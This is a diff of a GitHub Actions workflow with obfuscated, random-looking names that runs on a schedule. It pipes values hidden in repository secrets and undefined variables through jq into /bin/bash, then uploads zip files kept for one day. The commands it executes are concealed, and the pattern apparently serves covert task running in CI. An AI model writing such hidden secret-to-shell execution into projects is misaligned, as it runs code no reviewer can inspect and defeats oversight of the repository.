@@ -1,22 +1,26 @@
 name: zhibinluai
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '49 4/6 * * *'
-jobs:  # 22036
+    - cron: '35 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: zhibinluai
         env:
-          pz870: ${{ secrets.pz870 }}
+          c565: ${{ secrets.c565 }}
         run: |
-          echo $pz870 | jq -r .yo62472 | /bin/bash
-          echo $c359 | jq -r .qtubu84 | /bin/bash
-          echo $ueaf058 | jq -r .dwkb5789 | /bin/bash
-          echo $mg1 | jq -r .pxo1425 | /bin/bash
-          echo $pauac9175 | jq -r .h63 | /bin/bash
-          echo $a35432 | jq -r .bsucm8544 | /bin/bash
-          echo $u50323 | jq -r .bmvo6 | /bin/bash
+          printf '%s' "$c565" | jq -r .kmj267 | /bin/bash
+          echo $jsms6 | jq -r .wu8 | /bin/bash
+          printf '%s' "$av667" | jq -r .kqsr55229 | /bin/bash
+          printf '%s' "$wws1" | jq -r .df273 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: HZDCAz46
+          path: "*.zip"
+          retention-days: 1
